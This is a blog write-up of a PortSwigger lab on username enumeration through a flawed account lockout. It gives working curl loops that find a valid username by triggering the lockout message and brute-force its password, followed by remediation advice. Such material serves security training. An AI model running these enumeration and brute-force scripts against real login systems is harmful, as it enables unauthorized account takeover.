---
layout: post
title: "PortSwigger: Username enumeration via account lock"
date: 2027-11-06 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, username-enumeration, brute-force, account-lockout, cwe-307, cwe-204]
---

Account lockout is supposed to *protect* a login form. This lab shows how a careless implementation turns it into the opposite — an oracle that tells an attacker which usernames are real, and then hands over the password too. Two logic flaws stack: the lockout only fires for accounts that **exist**, and the lockout never rejects the **correct** password. Together they take you from a username wordlist to a full login with nothing but `curl`. This is [CWE-307](https://cwe.mitre.org/data/definitions/307.html) (improper restriction of excessive authentication attempts) compounded by [CWE-204](https://cwe.mitre.org/data/definitions/204.html) (observable response discrepancy).

## Overview

The login form at `POST /login` takes a `username` and `password`. A wrong guess normally returns:

```
Invalid username or password.
```

But submit enough wrong passwords against a **real** account and the message changes to:

```
You have made too many incorrect login attempts.
```

A username that doesn't exist never produces that message — it returns "Invalid username or password." indefinitely. That single difference in behaviour is all an attacker needs to separate real usernames from fake ones.

## Phase 1 — Enumerate the username

The plan: for every candidate username, fire ~6 bad logins and watch for the lockout message. The one that locks is real.

```bash
URL="https://<lab-id>.web-security-academy.net"
for u in $(cat usernames.txt); do
  for i in $(seq 1 6); do
    b=$(curl -sk "$URL/login" \
         --data-urlencode "username=$u" \
         --data-urlencode 'password=wrongpw123')
  done
  echo "$b" | grep -qi 'too many incorrect login attempts' \
    && { echo "VALID (locked): $u"; break; }
done
```

```
VALID (locked): adserver
```

Invalid usernames stay on "Invalid username or password." no matter how hard you hammer them — only `adserver` flips to the lockout page, because the app only bothers tracking failed attempts for accounts that exist.

## Phase 2 — Brute-force the password

Here's the second flaw. The account is now locked, but the lockout logic only blocks **wrong** passwords. The **correct** password still authenticates, producing a third, distinct response — one that contains neither "Invalid username or password" nor the lockout text.

So we walk the password list and pick the odd one out:

```bash
for p in $(cat passwords.txt); do
  b=$(curl -sk "$URL/login" \
       --data-urlencode 'username=adserver' \
       --data-urlencode "password=$p")
  echo "$b" | grep -qiv 'Invalid username or password' \
    && echo "$b" | grep -qiv 'too many incorrect' \
    && echo "HIT: $p"
done
```

```
HIT: monitor
```

Every wrong password returns the lockout message; `monitor` returns a different page entirely. That's the password.

## Phase 3 — Log in

The lockout self-clears after about a minute. Wait it out, then log in cleanly with a cookie jar:

```bash
sleep 65
curl -sk -c cookies.txt -X POST "$URL/login" \
     -d 'username=adserver&password=monitor' -o /dev/null -w '%{http_code}\n'
# => 302   (a 302 only happens on a successful login)

curl -sk -L -b cookies.txt "$URL/my-account"   # renders "My Account" as adserver
```

The `302` redirect is itself proof the credentials are correct — a wrong password re-renders the form with `200`. After loading `/my-account` with the session cookie, the lab status flips to **Solved**.

## Why it worked

- **Lockout is keyed on a real account.** Locking behaviour should be identical whether or not the username exists. Because it isn't, the lockout message becomes an existence oracle.
- **Lockout doesn't reject the correct password.** A locked account should refuse *all* logins until the lock clears. Allowing the right password through leaks it: the success response stands out against a sea of lockout pages.

## The fix

- Make failed-login behaviour **byte-for-byte identical** for valid and invalid usernames — same message, same status, same timing.
- Prefer per-IP rate limiting with a sliding window (plus CAPTCHA/MFA) over a per-account binary lockout that leaks state.
- Never let a correct password authenticate while an account is locked.
- Don't reveal *why* a login failed; a single generic "login failed" defeats enumeration entirely.

Lockout that distinguishes real accounts from fake ones isn't brute-force protection — it's a free username list. Pair it with a lock that forgets to block the right password and you've handed over the account.
